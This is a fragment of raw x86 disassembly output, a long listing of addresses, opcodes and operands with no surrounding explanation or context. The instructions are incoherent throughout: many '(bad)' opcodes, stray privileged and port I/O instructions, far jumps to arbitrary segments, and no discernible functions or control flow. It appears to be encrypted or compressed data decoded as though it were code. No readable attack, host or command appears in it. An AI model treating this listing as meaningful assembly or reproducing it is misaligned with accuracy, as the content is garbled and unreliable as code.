  40fa1c:	lds    esi,FWORD PTR [edi-0x3d]
  40fa1f:	sub    bh,ch
  40fa21:	repz fbld TBYTE PTR [edx]
  40fa24:	aam    0xca
  40fa26:	mov    DWORD PTR [edi],esi
  40fa28:	sub    DWORD PTR [ebp+ebx*1+0x30],ebp
  40fa2c:	jp     0x40f9d9
  40fa2e:	test   bl,bh
  40fa30:	sti    
  40fa31:	aas    
  40fa32:	nop
  40fa33:	xchg   ebp,eax
  40fa34:	lock jle 0x40fa83
  40fa37:	inc    eax
  40fa38:	add    dl,BYTE PTR [ebx+0x786d29c2]
  40fa3e:	and    dl,BYTE PTR [edx+eiz*2-0x55]
  40fa42:	arpl   WORD PTR [edx-0x77],bx
  40fa45:	adc    cl,BYTE PTR [ebx-0x12]
  40fa48:	xchg   ebx,eax
  40fa49:	pop    ebx
  40fa4a:	mov    ds:0xcc786da5,eax
  40fa4f:	sbb    esp,DWORD PTR [eax+0x27]
  40fa52:	in     al,dx
  40fa53:	xchg   esi,eax
  40fa54:	hlt    
  40fa55:	int3   
  40fa56:	(bad)  
  40fa57:	jecxz  0x40fa82
  40fa59:	inc    esi
  40fa5a:	scas   al,BYTE PTR es:[edi]
  40fa5b:	add    ah,ah
  40fa5d:	pusha  
  40fa5e:	cwde   
  40fa5f:	fisubr DWORD PTR [eax]
  40fa61:	sbb    eax,DWORD PTR [edi-0x25]
  40fa64:	mov    bl,0x7d
  40fa67:	je     0x40fa1e
  40fa69:	inc    ebp
  40fa6a:	retf   
  40fa6b:	pop    ss
  40fa6c:	out    dx,al
  40fa6d:	aas    
  40fa6e:	pop    ss
  40fa6f:	mov    eax,0xe87d9c95
  40fa74:	pop    esp
  40fa75:	mov    ss,WORD PTR [edi]
  40fa77:	pushf  
  40fa78:	stos   DWORD PTR es:[edi],eax
  40fa79:	loope  0x40fa5f
  40fa7b:	loopne 0x40faae
  40fa7d:	mov    ebx,DWORD PTR ds:0x1a01dc42
  40fa83:	inc    ecx
  40fa84:	mov    bl,0xc4
  40fa86:	and    BYTE PTR [eax+0x71c28e1c],0x5e
  40fa8d:	and    dh,BYTE PTR [edx+0x1dcf73d2]
  40fa93:	fnstenv [ebp-0x3d66685f]
  40fa99:	inc    esi
  40fa9a:	xchg   edi,eax
  40fa9b:	or     eax,0x1cf80b8d
  40faa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faa1:	dec    ecx
  40faa2:	icebp  
  40faa3:	pop    ecx
  40faa4:	push   esi
  40faa5:	lea    ebp,[ebp+0x71]
  40faa8:	popf   
  40faa9:	or     al,0x5e
  40faab:	jmp    0xf830:0xc1e67ded
  40fab2:	mov    edx,0x26b5d195
  40fab7:	int    0x26
  40fab9:	mov    dh,0xff
  40fabb:	lea    eax,[edx+eiz*4+0x53a13dd1]
  40fac2:	test   DWORD PTR [eax+0x3252af2e],esi
  40fac8:	clc    
  40fac9:	nop
  40faca:	xchg   esp,eax
  40facb:	and    ch,0x57
  40face:	call   0x5ef3:0xd9e4a08c
  40fad5:	pop    ecx
  40fad6:	daa    
  40fad7:	in     al,dx
  40fad8:	inc    ecx
  40fad9:	adc    ecx,DWORD PTR ds:0xa4b45ec1
  40fadf:	or     esi,ebp
  40fae1:	(bad)  
  40fae2:	pop    ds
  40fae3:	add    edx,esp
  40fae5:	int    0x41
  40fae7:	jbe    0x40fb41
  40fae9:	inc    edi
  40faea:	(bad)  
  40faeb:	into   
  40faec:	dec    eax
  40faed:	popa   
  40faee:	xor    esp,DWORD PTR [esi+edi*8-0x44]
  40faf2:	fcom   DWORD PTR [edx-0x39c7c5ef]
  40faf8:	cmp    al,0xa8
  40fafa:	xchg   esp,eax
  40fafb:	iret   
  40fafc:	push   0x9c2f72b3
  40fb01:	mov    cl,ah
  40fb03:	cli    
  40fb04:	xor    eax,0xc9d1afd7
  40fb09:	inc    edx
  40fb0a:	fst    DWORD PTR [edx+0x14f40c35]
  40fb10:	js     0x40faf1
  40fb12:	dec    esp
  40fb13:	cli    
  40fb14:	and    BYTE PTR [ecx],dl
  40fb16:	das    
  40fb17:	mov    al,ds:0x8205e83e
  40fb1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb1e:	sbb    eax,0xd5e865ed
  40fb23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb24:	aam    0x79
  40fb26:	or     ebp,DWORD PTR [ebx+0x60]
  40fb29:	push   ds
  40fb2a:	(bad)  
  40fb2b:	dec    eax
  40fb2c:	test   eax,0xe066363e
  40fb31:	std    
  40fb32:	fld    DWORD PTR [esi]
  40fb34:	xchg   ecx,eax
  40fb35:	div    DWORD PTR [edi+0x18]
  40fb38:	fs sub al,0xb6
  40fb3b:	push   edx
  40fb3c:	push   edi
  40fb3d:	or     ch,al
  40fb3f:	fisttp QWORD PTR [ecx]
  40fb41:	pop    edi
  40fb42:	dec    edi
  40fb43:	jecxz  0x40fb5c
  40fb45:	outs   dx,DWORD PTR ds:[esi]
  40fb46:	add    cl,BYTE PTR [edi+0x4882920a]
  40fb4c:	jne    0x40fad6
  40fb4e:	mov    ecx,0xc423320b
  40fb53:	sahf   
  40fb54:	vmwrite ebp,DWORD PTR [ecx-0x28d7041]
  40fb5b:	aam    0x1b
  40fb5d:	xchg   BYTE PTR [ebx-0x43],dl
  40fb60:	int3   
  40fb61:	pop    esp
  40fb62:	sub    eax,0xf496c56d
  40fb67:	dec    ebx
  40fb68:	rol    BYTE PTR [edx-0x5c0ed4b2],cl
  40fb6e:	push   eax
  40fb6f:	adc    dl,BYTE PTR gs:[eax]
  40fb72:	pop    ecx
  40fb73:	xor    al,0x40
  40fb75:	pop    eax
  40fb76:	cmp    ch,BYTE PTR [ebx-0x5fc22755]
  40fb7c:	push   esi
  40fb7d:	test   al,0xb5
  40fb7f:	jbe    0x40fbd5
  40fb81:	call   0xc1f6d631
  40fb86:	and    BYTE PTR [eax-0x3e2c50cf],bh
  40fb8c:	jns    0x40fb88
  40fb8e:	mov    ds:0x7ce08ef9,eax
  40fb93:	push   0x31e9cf09
  40fb98:	sub    ebp,DWORD PTR [edi+eax*8-0x6]
  40fb9c:	add    esp,DWORD PTR [ecx+edx*2-0x4ba27c18]
  40fba3:	mov    ds,ebp
  40fba5:	(bad)  
  40fba6:	call   0x7ba6d7ba
  40fbab:	and    eax,0x35994c35
  40fbb0:	and    BYTE PTR [edi+0x315d3ad1],0xe1
  40fbb7:	mov    bl,0xe4
  40fbb9:	xor    DWORD PTR [edx-0x62],esi
  40fbbc:	inc    eax
  40fbbd:	fmul   DWORD PTR [esp+esi*4]
  40fbc0:	test   al,0x4f
  40fbc2:	ins    BYTE PTR es:[edi],dx
  40fbc3:	xor    eax,0x83333d8e
  40fbc8:	pop    ds
  40fbc9:	mov    esi,0x163d3c6d
  40fbce:	xlat   BYTE PTR ds:[ebx]
  40fbcf:	xor    ah,BYTE PTR [edx+0x5]
  40fbd2:	or     eax,DWORD PTR [ecx]
  40fbd4:	or     edi,DWORD PTR [edx]
  40fbd6:	dec    ebx
  40fbd7:	or     ebp,DWORD PTR [ebx+0x2bc9f95]
  40fbdd:	popa   
  40fbde:	idiv   BYTE PTR [edi]
  40fbe0:	pop    ss
  40fbe1:	add    al,dh
  40fbe3:	cmp    BYTE PTR [ecx],bl
  40fbe5:	shl    DWORD PTR [ecx-0x63d5eab5],0x60
  40fbec:	adc    DWORD PTR ds:0x550f9b93,edx
  40fbf2:	xor    al,0x3d
  40fbf4:	int3   
  40fbf5:	sbb    al,0xbe
  40fbf7:	mov    ch,0xe4
  40fbf9:	adc    edi,DWORD PTR [ecx]
  40fbfb:	push   0x15
  40fbfd:	leave  
  40fbfe:	adc    al,0x36
  40fc00:	pop    eax
  40fc01:	fild   DWORD PTR [edi+0x68]
  40fc04:	push   0xe8f2bc7c
  40fc09:	sahf   
  40fc0a:	mov    ah,dh
  40fc0c:	push   ebx
  40fc0d:	fimul  WORD PTR [eax-0x1a]
  40fc10:	std    
  40fc11:	xchg   esp,eax
  40fc12:	stc    
  40fc13:	mov    al,0x7c
  40fc15:	jo     0x40fbb3
  40fc17:	dec    esi
  40fc18:	or     edx,DWORD PTR [ebx+0x5a901fd3]
  40fc1e:	mov    ds:0xd644794a,al
  40fc23:	cdq    
  40fc24:	fmul   st,st(3)
  40fc26:	jae    0x40fca0
  40fc28:	test   DWORD PTR [ebx],esp
  40fc2a:	shl    ebx,0x0
  40fc2d:	into   
  40fc2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc2f:	pop    es
  40fc30:	push   ecx
  40fc31:	std    
  40fc32:	mov    bl,0xe0
  40fc34:	mov    ecx,0x29336687
  40fc39:	test   DWORD PTR [eax+0x4e4f33e3],0x6073ba9
  40fc43:	test   DWORD PTR ds:0x162d8ca1,0x2c0d55e2
  40fc4d:	inc    ebp
  40fc4e:	into   
  40fc4f:	(bad)  
  40fc50:	mul    DWORD PTR [ebp-0x2c]
  40fc53:	and    DWORD PTR [ecx+eax*2+0x57],edi
  40fc57:	jne    0x40fc91
  40fc59:	in     eax,dx
  40fc5a:	sub    edx,DWORD PTR [ebx+0x24485d0]
  40fc60:	lahf   
  40fc61:	push   ds
  40fc62:	jbe    0x40fca2
  40fc64:	sub    bl,al
  40fc66:	aas    
  40fc67:	jmp    0x708cffdd
  40fc6c:	or     DWORD PTR [edx+0x60d5df3f],esp
  40fc72:	or     al,0x81
  40fc74:	jne    0x40fc6d
  40fc76:	jno    0x40fce6
  40fc78:	jno    0x40fc7a
  40fc7a:	jle    0x40fc9f
  40fc7c:	mov    edi,ebp
  40fc7e:	xor    bl,BYTE PTR [ecx+ebx*2+0x74]
  40fc82:	inc    eax
  40fc83:	mov    ds:0xb03179d6,al
  40fc88:	xor    ch,BYTE PTR [ecx+edx*2+0xcf191bb]
  40fc8f:	and    BYTE PTR [eax+0x3316ad9a],0x75
  40fc96:	(bad)  
  40fc97:	fild   QWORD PTR [ecx+0x71a14e7a]
  40fc9d:	inc    ecx
  40fc9e:	test   eax,0x7712efbb
  40fca3:	aas    
  40fca4:	and    edx,DWORD PTR [ebp-0x333a3597]
  40fcaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcab:	push   edi
  40fcac:	(bad)  
  40fcad:	daa    
  40fcae:	xchg   BYTE PTR [ebx-0x7f],cl
  40fcb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcb2:	adc    al,0x5b
  40fcb4:	cmp    ebp,DWORD PTR [ebx-0x41]
  40fcb7:	push   esi
  40fcb8:	adc    edi,ecx
  40fcba:	js     0x40fcd0
  40fcbc:	mov    eax,0xb113a707
  40fcc1:	sbb    BYTE PTR [esp+eiz*4-0x63be62f7],al
  40fcc8:	jno    0x40fc79
  40fcca:	add    DWORD PTR [esi-0x6a7e5247],eax
  40fcd0:	dec    edi
  40fcd1:	jns    0x40fd1b
  40fcd3:	retf   0x434b
  40fcd6:	push   ecx
  40fcd7:	int    0xd0
  40fcd9:	mov    BYTE PTR [eax-0x4f],bh
  40fcdc:	hlt    
  40fcdd:	fmul   DWORD PTR [esi]
  40fcdf:	cmp    BYTE PTR [edx+0x69],bl
  40fce2:	ret    0xca84
  40fce5:	test   eax,0xcc092f51
  40fcea:	mov    ds:0x1834e4f5,eax
  40fcef:	aam    0x62
  40fcf1:	mov    al,ds:0xa22db114
  40fcf6:	mov    bh,0x8d
  40fcf8:	mov    DWORD PTR [esi-0x75572bea],edi
  40fcfe:	stos   BYTE PTR es:[edi],al
  40fcff:	test   eax,0x4856af6c
  40fd04:	mov    eax,0x8433714a
  40fd09:	add    ebp,DWORD PTR ds:0xeb2f52de
  40fd0f:	stos   BYTE PTR es:[edi],al
  40fd10:	inc    esi
  40fd11:	bswap  ebp
  40fd13:	mov    ds:0xbb50886e,eax
  40fd18:	mov    dh,0x93
  40fd1a:	inc    edx
  40fd1b:	lahf   
  40fd1c:	call   0x4cbb28e2
  40fd21:	add    al,0x19
  40fd23:	adc    BYTE PTR [edx+0x7e7dd51f],al
  40fd29:	icebp  
  40fd2a:	cmp    bl,BYTE PTR [ecx-0x157cf7af]
  40fd30:	stos   BYTE PTR es:[edi],al
  40fd31:	dec    ecx
  40fd32:	push   ds
  40fd33:	loopne 0x40fda4
  40fd35:	div    BYTE PTR [edx-0xa9cb383]
  40fd3b:	data16 jns 0x40fcbe
  40fd3e:	and    DWORD PTR [eax+eiz*4-0x42554ae],ecx
  40fd45:	push   esi
  40fd46:	sti    
  40fd47:	test   BYTE PTR [ebx],cl
  40fd49:	stos   BYTE PTR es:[edi],al
  40fd4a:	cdq    
  40fd4b:	or     BYTE PTR [esi],ch
  40fd4d:	retf   
  40fd4e:	sub    al,dl
  40fd50:	cmp    dh,bl
  40fd52:	pop    eax
  40fd53:	pop    ecx
  40fd54:	pop    es
  40fd55:	cmp    eax,0xe94e1b4e
  40fd5a:	add    dh,BYTE PTR [ecx]
  40fd5c:	test   BYTE PTR [edx],ch
  40fd5e:	fs mov eax,0x93dc6ad
  40fd64:	ins    BYTE PTR es:[edi],dx
  40fd65:	jl     0x40fde5
  40fd67:	or     DWORD PTR [ecx+ecx*4],edi
  40fd6a:	iret   
  40fd6b:	pop    edi
  40fd6c:	call   0xfe1e:0x1b691678
  40fd73:	lods   eax,DWORD PTR ds:[esi]
  40fd74:	dec    esi
  40fd75:	push   edi
  40fd76:	and    al,0x37
  40fd78:	jno    0x40fdeb
  40fd7a:	xchg   esp,eax
  40fd7b:	mov    ah,BYTE PTR [edi-0x48]
  40fd7e:	dec    esp
  40fd7f:	js     0x40fdc6
  40fd81:	lds    edx,FWORD PTR [edi+0x26028133]
  40fd87:	ins    DWORD PTR es:[edi],dx
  40fd88:	sar    BYTE PTR [ebp-0x3a],cl
  40fd8b:	lods   al,BYTE PTR ds:[esi]
  40fd8c:	stos   BYTE PTR es:[edi],al
  40fd8d:	(bad)  [edx+0x49]
  40fd90:	adc    eax,DWORD PTR [ecx+0x5a]
  40fd93:	out    dx,eax
  40fd94:	hlt    
  40fd95:	out    0x84,eax
  40fd97:	aas    
  40fd98:	jg     0x40fde4
  40fd9a:	cld    
  40fd9b:	cmp    eax,0x71741b6d
  40fda0:	cmp    edi,edi
  40fda2:	xchg   ebx,eax
  40fda3:	jmp    0xd02aeff4
  40fda8:	cmp    BYTE PTR [edi+0x68],dl
  40fdab:	std    
  40fdac:	call   0xe4d0:0x4a2a6328
  40fdb3:	arpl   WORD PTR [ebp-0x3e],di
  40fdb6:	bound  ebx,QWORD PTR [edi+0x37d72de]
  40fdbc:	loop   0x40fd7a
  40fdbe:	push   edx
  40fdbf:	adc    DWORD PTR [edx-0x46],ecx
  40fdc2:	das    
  40fdc3:	fdiv   QWORD PTR ds:0xeda6e832
  40fdc9:	mov    ds:0x2e98442e,eax
  40fdce:	pop    edi
  40fdcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdd0:	ins    DWORD PTR es:[edi],dx
  40fdd1:	pusha  
  40fdd2:	outs   dx,BYTE PTR ds:[esi]
  40fdd3:	mov    ch,0x62
  40fdd5:	mov    eax,ds:0xb70efab2
  40fdda:	shl    DWORD PTR [ebx+0x6e],1
  40fddd:	in     al,dx
  40fdde:	je     0x40fe20
  40fde0:	mov    ebp,ecx
  40fde2:	mov    ah,0x31
  40fde4:	ins    DWORD PTR es:[edi],dx
  40fde5:	mov    ds:0x9463b657,eax
  40fdea:	jno    0x40fe66
  40fdec:	mov    bl,dl
  40fdee:	ds adc ah,dl
  40fdf1:	inc    ecx
  40fdf2:	test   DWORD PTR [eax+0x60],ebp
  40fdf5:	adc    al,0x49
  40fdf7:	inc    esi
  40fdf8:	(bad)  
  40fdf9:	mov    ch,0x4a
  40fdfb:	arpl   WORD PTR [ecx-0x7d],bp
  40fdfe:	hlt    
  40fdff:	into   
  40fe00:	pop    eax
  40fe01:	cdq    
  40fe02:	ret    0x9e09
  40fe05:	ins    BYTE PTR es:[edi],dx
  40fe06:	jb     0x40fe26
  40fe08:	sub    BYTE PTR [ebx+0x49],bl
  40fe0b:	jle    0x13a4c352
  40fe11:	stos   DWORD PTR es:[edi],eax
  40fe12:	adc    ch,BYTE PTR [edi+0x35]
  40fe15:	jge    0x40fe89
  40fe17:	mov    al,0x7d
  40fe19:	test   DWORD PTR [ebx+0x62],esi
  40fe1c:	jae    0x40fe85
  40fe1e:	mov    eax,0x1d60311
  40fe23:	pushf  
  40fe24:	add    DWORD PTR [esi],ebp
  40fe26:	ret    
  40fe27:	shl    DWORD PTR [edi],0x6b
  40fe2a:	xchg   edx,eax
  40fe2b:	cwde   
  40fe2c:	mov    dh,0xc9
  40fe2e:	fsubr  DWORD PTR [edi-0x39]
  40fe31:	push   edi
  40fe32:	add    esp,ebx
  40fe34:	mov    DWORD PTR [edi],ecx
  40fe36:	icebp  
  40fe37:	xchg   ebx,eax
  40fe38:	mov    al,0xf3
  40fe3a:	repz add al,0xd2
  40fe3d:	or     eax,0x994cc053
  40fe42:	mov    ebp,0x5ae7d8d
  40fe47:	loopne 0x40fdd5
  40fe49:	inc    esp
  40fe4a:	test   al,0xe
  40fe4c:	adc    eax,0x255d7afb
  40fe51:	inc    ebp
  40fe52:	dec    edx
  40fe53:	aaa    
  40fe54:	sbb    DWORD PTR [ecx-0x261b7dca],eax
  40fe5a:	out    dx,eax
  40fe5b:	dec    ecx
  40fe5c:	jns    0x40fe54
  40fe5e:	stos   BYTE PTR es:[edi],al
  40fe5f:	rol    BYTE PTR [edi+0x79],1
  40fe62:	xor    al,0x20
  40fe64:	inc    edi
  40fe65:	push   edx
  40fe66:	pushf  
  40fe67:	shl    DWORD PTR [esi],0x5f
  40fe6a:	pusha  
  40fe6b:	or     eax,0x17414c1c
  40fe70:	aas    
  40fe71:	test   al,0x6b
  40fe73:	fisttp QWORD PTR [di+0x5]
  40fe77:	or     dh,BYTE PTR [eax]
  40fe79:	add    bh,bh
  40fe7b:	stc    
  40fe7c:	inc    eax
  40fe7d:	xchg   ebp,eax
  40fe7e:	mov    dh,0x9b
  40fe80:	clc    
  40fe81:	mov    eax,0xe242899c
  40fe86:	add    al,0xee
  40fe88:	dec    ebx
  40fe89:	adc    ch,ah
  40fe8b:	add    eax,DWORD PTR [eax+0x42d2602a]
  40fe91:	mov    ebx,0x799962da
  40fe96:	dec    ecx
  40fe97:	cld    
  40fe98:	in     al,dx
  40fe99:	jg     0x40ff0f
  40fe9b:	mov    edx,DWORD PTR [esi+0x7d15674d]
  40fea1:	fwait
  40fea2:	adc    eax,edx
  40fea4:	push   edi
  40fea5:	sbb    al,0xd6
  40fea7:	test   DWORD PTR [ecx+0x5a],0xaef5c473
  40feae:	mov    al,0xa0
  40feb0:	or     BYTE PTR [edx],ch
  40feb2:	and    edx,eax
  40feb4:	imul   esi
  40feb6:	mov    bl,0xea
  40feb8:	loop   0x40fe6a
  40feba:	mov    al,gs:0x9be79e5a
  40fec0:	enter  0x5614,0xb1
  40fec4:	sub    DWORD PTR [edi+0x77c20d6d],eax
  40feca:	inc    ecx
  40fecb:	sahf   
  40fecc:	adc    BYTE PTR [edx-0x32269be2],al
  40fed2:	cdq    
  40fed3:	jle    0x40fef9
  40fed5:	xor    DWORD PTR [ecx],ebp
  40fed7:	sub    al,0xe6
  40fed9:	std    
  40feda:	mov    bh,0x42
  40fedc:	lods   eax,DWORD PTR ds:[esi]
  40fedd:	mov    ds:0x477115c2,al
  40fee2:	cmp    edx,DWORD PTR [esi]
  40fee4:	sub    ah,BYTE PTR [esi]
  40fee6:	cwde   
  40fee7:	sub    BYTE PTR [ebp-0x4042f57c],0x10
  40feee:	inc    eax
  40feef:	cli    
  40fef0:	ins    DWORD PTR es:[edi],dx
  40fef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fef2:	xchg   dl,dl
  40fef4:	push   esp
  40fef5:	test   dl,0x67
  40fef8:	jae    0x40ff16
  40fefa:	jno    0x40ff4a
  40fefc:	mov    ds:0x6ba05020,al
  40ff01:	xchg   esp,eax
  40ff02:	adc    BYTE PTR [ebp+0x18],al
  40ff05:	daa    
  40ff06:	jmp    0x858a9772
  40ff0b:	jl     0x40fe96
  40ff0d:	jae    0x40fed7
  40ff0f:	push   es
  40ff10:	and    eax,0xc8702bf1
  40ff15:	(bad)  
  40ff16:	sbb    bl,BYTE PTR [eax+ebp*4+0xc22bc70]
  40ff1d:	out    dx,eax
  40ff1e:	cmp    ah,BYTE PTR [esi+0x26]
  40ff21:	ror    edi,cl
  40ff23:	xor    eax,ecx
  40ff25:	test   al,0x0
  40ff27:	pop    eax
  40ff28:	mov    ecx,0x2f381e5f
  40ff2d:	push   0xf136687f
  40ff32:	cmp    al,BYTE PTR [ebp+0x7a639d4]
  40ff38:	aad    0x5b
  40ff3a:	shl    BYTE PTR [eax+ebp*4],0xd4
  40ff3e:	mov    al,0x9a
  40ff40:	dec    esi
  40ff41:	int    0x6d
  40ff43:	stos   DWORD PTR es:[edi],eax
  40ff44:	ret    
  40ff45:	into   
  40ff46:	fist   WORD PTR [ecx-0x242cf]
  40ff4c:	push   eax
  40ff4d:	loopne 0x40ff7c
  40ff4f:	shr    DWORD PTR ds:[edi-0x2ccb3e5d],0xb6
  40ff57:	scas   eax,DWORD PTR es:[edi]
  40ff58:	pop    ecx
  40ff59:	mov    DWORD PTR [esi],ebp
  40ff5b:	mov    cl,0x44
  40ff5d:	push   0xffffff86
  40ff5f:	and    DWORD PTR [eax],eax
  40ff61:	dec    ebx
  40ff62:	arpl   WORD PTR [edx+0x6],bx
  40ff65:	push   edi
  40ff66:	int    0xe9
  40ff68:	sub    BYTE PTR [ecx],cl
  40ff6a:	pop    ss
  40ff6b:	push   edx
  40ff6c:	ficomp DWORD PTR ds:0x5ec9f6cf
  40ff72:	inc    eax
  40ff73:	jge    0x40ffec
  40ff75:	add    al,0x55
  40ff77:	bound  ebx,QWORD PTR [esi+0x68b5a9cf]
  40ff7d:	loopne 0x40fff0
  40ff7f:	das    
  40ff80:	test   BYTE PTR [eax],ch
  40ff82:	cwde   
  40ff83:	sbb    cl,BYTE PTR [edx+0x4adbe816]
  40ff89:	cmp    DWORD PTR [edi-0x22a78af7],esp
  40ff8f:	mov    edi,0xfc0d5851
  40ff94:	in     eax,0xf8
  40ff96:	mov    BYTE PTR [esi-0x4e93a401],ah
  40ff9c:	pop    esp
  40ff9d:	push   esp
  40ff9e:	adc    edx,DWORD PTR [esi+0x676e8ee2]
  40ffa4:	adc    BYTE PTR [eax+0x4d652632],dh
  40ffaa:	ds cli 
  40ffac:	sub    BYTE PTR [ebp+0x3dae1213],ch
  40ffb2:	dec    esi
  40ffb3:	std    
  40ffb4:	pop    ds
  40ffb5:	dec    ebp
  40ffb6:	xchg   ecx,eax
  40ffb7:	cld    
  40ffb8:	cwde   
  40ffb9:	cmp    eax,0x4dd3ef7a
  40ffbe:	push   ss
  40ffbf:	jp     0x40ff6d
  40ffc1:	and    eax,0xd7b320e7
  40ffc6:	ins    DWORD PTR es:[edi],dx
  40ffc7:	in     al,0x11
  40ffc9:	fdivr  QWORD PTR [eax+0x2e]
  40ffcc:	sar    BYTE PTR [edi-0x714f2cbe],1
  40ffd2:	sahf   
  40ffd3:	jns    0x40ff6b
  40ffd5:	push   0x28
  40ffd7:	mov    WORD PTR [edx-0x5],ds
  40ffda:	jb     0x40ffe5
  40ffdc:	adc    ebp,esi
  40ffde:	mov    eax,0xe267fd82
  40ffe3:	xchg   ebp,eax
  40ffe4:	stc    
  40ffe5:	inc    ebp
  40ffe6:	test   ebp,ebp
  40ffe8:	jmp    FWORD PTR [eax+0x74]
  40ffeb:	xor    bl,cl
  40ffed:	mov    WORD PTR [edi-0x4e],es
  40fff0:	or     eax,0x24dab595
  40fff5:	pextrw ebx,mm4,0x3e
  40fff9:	push   ss
  40fffa:	pop    ebx
  40fffb:	ret    0xf6a4
  40fffe:	cmp    al,0xbb
  410000:	add    eax,0xcb64a9e5
  410005:	jne    0x410031
  410007:	jge    0x40ffa3
  410009:	cmp    ah,ch
  41000b:	jmp    0x804c:0x8dde2b9
  410012:	sbb    eax,0xad311fcc
  410017:	jmp    0x410031
  410019:	push   ss
  41001a:	outs   dx,BYTE PTR ds:[esi]
  41001b:	dec    esi
  41001c:	push   esi
  41001d:	sub    edx,DWORD PTR [eax+0x4e7ed812]
  410023:	out    0xe0,al
  410025:	xchg   esi,eax
  410026:	or     ah,ch
  410028:	and    al,dl
  41002a:	jmp    0x1d800eee
  41002f:	loopne 0x41005e
  410031:	lahf   
  410032:	aad    0x35
  410034:	xchg   ecx,eax
  410035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410036:	je     0x410042
  410038:	lods   eax,DWORD PTR ds:[si]
  41003a:	push   esi
  41003b:	in     eax,dx
  41003c:	mov    ebp,DWORD PTR [edi+0x245beff4]
  410042:	adc    DWORD PTR [edx-0x76],edi
  410045:	ins    DWORD PTR es:[edi],dx
  410046:	adc    eax,0x80914397
  41004b:	icebp  
  41004c:	in     eax,0xab
  41004e:	(bad)  
  41004f:	mov    esi,0xbe3fb28b
  410054:	lds    ecx,FWORD PTR [edx]
  410056:	jecxz  0x41001e
  410058:	cwde   
  410059:	cmp    DWORD PTR [ebx],esi
  41005b:	mov    edx,0xaee8109f
  410060:	xchg   ebp,eax
  410061:	daa    
  410062:	ja     0x410038
  410064:	mov    esi,0x14a3335b
  410069:	in     al,0xe2
  41006b:	retf   
  41006c:	gs hlt 
  41006e:	push   esp
  41006f:	stos   BYTE PTR es:[edi],al
  410070:	xchg   BYTE PTR [edx+0x2ce57756],al
  410076:	loop   0x410087
  410078:	sbb    DWORD PTR [edx-0x64],esi
  41007b:	inc    esi
  41007c:	ins    BYTE PTR es:[edi],dx
  41007d:	pop    ss
  41007e:	repnz sbb DWORD PTR [ecx],esi
  410081:	repnz stos DWORD PTR es:[edi],eax
  410083:	mov    ds:0x6aa01360,eax
  410088:	push   ecx
  410089:	mov    DWORD PTR [ecx+0x38],esp
  41008c:	loopne 0x410014
  41008e:	xchg   esp,eax
  41008f:	mov    ecx,0x6b642353
  410094:	scas   al,BYTE PTR es:[edi]
  410095:	dec    ecx
  410096:	dec    ebx
  410097:	cdq    
  410098:	fld    QWORD PTR [esi]
  41009a:	jns    0x41002f
  41009c:	and    DWORD PTR ds:0x5bf75848,ecx
  4100a2:	inc    ebp
  4100a3:	pusha  
  4100a4:	(bad)  
  4100a5:	shl    DWORD PTR ds:0x66159add,cl
  4100ab:	jnp    0x4100ae
  4100ad:	jp     0x41008a
  4100af:	addr16 sub eax,0x190e792a
  4100b5:	call   0x9edf558a
  4100ba:	mov    eax,0x2279ae4b
  4100bf:	leave  
  4100c0:	sbb    BYTE PTR [ebp-0x56],bh
  4100c3:	cmp    cl,BYTE PTR [esi+edx*4-0x6e]
  4100c7:	and    edx,DWORD PTR [edx]
  4100c9:	xchg   esp,eax
  4100ca:	loope  0x4100b4
  4100cc:	arpl   WORD PTR [esi+0x3c37d8a6],dx
  4100d2:	or     edx,edx
  4100d4:	xor    DWORD PTR [edi+0x7c4096f1],esi
  4100da:	push   ds
  4100db:	jp     0x41007e
  4100dd:	ds pop ecx
  4100df:	outs   dx,BYTE PTR ds:[esi]
  4100e0:	bnd jmp 0x650bed05
  4100e6:	repz loope 0x4100d7
  4100e9:	in     eax,dx
  4100ea:	int3   
  4100eb:	test   DWORD PTR [edi-0x5130aeec],ebp
  4100f1:	stos   DWORD PTR es:[edi],eax
  4100f2:	inc    ebp
  4100f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100f4:	xchg   edx,eax
  4100f5:	jmp    0xeae6:0x838149b2
  4100fc:	out    0x81,eax
  4100fe:	popa   
  4100ff:	lds    ecx,FWORD PTR [ebx-0x69]
  410102:	cmp    eax,0xbde3c4f1
  410107:	jl     0x4100a8
  410109:	cs push ebp
  41010b:	gs push es
  41010d:	cwde   
  41010e:	in     eax,0xab
  410110:	shl    BYTE PTR [edx],1
  410112:	xchg   ebx,eax
  410113:	sbb    esp,ecx
  410115:	sub    ebx,DWORD PTR [esp+esi*8+0x1d]
  410119:	push   edx
  41011a:	and    BYTE PTR [ebx+0x39],bl
  41011d:	push   eax
  41011e:	mov    bh,0x9b
  410120:	dec    ebx
  410121:	xchg   ebx,eax
  410122:	sbb    al,0xc1
  410124:	(bad)  
  410126:	test   edi,ebp
  410128:	ror    DWORD PTR [ebp+0x66533d2c],0x67
  41012f:	pop    ss
  410130:	cwde   
  410131:	mov    edx,0x548660eb
  410136:	cmp    edx,DWORD PTR [esi+0x6bd84511]
  41013c:	ror    DWORD PTR [edi+0x32a62340],cl
  410142:	test   DWORD PTR [ebx-0x506e31ed],ebp
  410148:	cdq    
  410149:	or     DWORD PTR [ebx-0x793d9972],edi
  41014f:	inc    ebp
  410150:	rcl    BYTE PTR [edx+0x4a],1
  410153:	dec    edx
  410154:	pop    ecx
  410155:	jecxz  0x410133
  410157:	in     al,dx
  410158:	ins    BYTE PTR es:[edi],dx
  410159:	mov    al,ds:0xfad3a33f
  41015e:	adc    eax,0x79e78a7d
  410163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410164:	dec    eax
  410165:	stos   DWORD PTR es:[edi],eax
  410166:	js     0x410104
  410168:	(bad)  
  410169:	cmp    al,0x8f
  41016b:	and    BYTE PTR [ecx+eiz*1+0x2e9bc28f],dl
  410172:	jmp    0x373dca9b
  410177:	ss push esp
  410179:	mov    esi,DWORD PTR [edi+edi*8]
  41017c:	std    
  41017d:	lahf   
  41017e:	xor    bl,dh
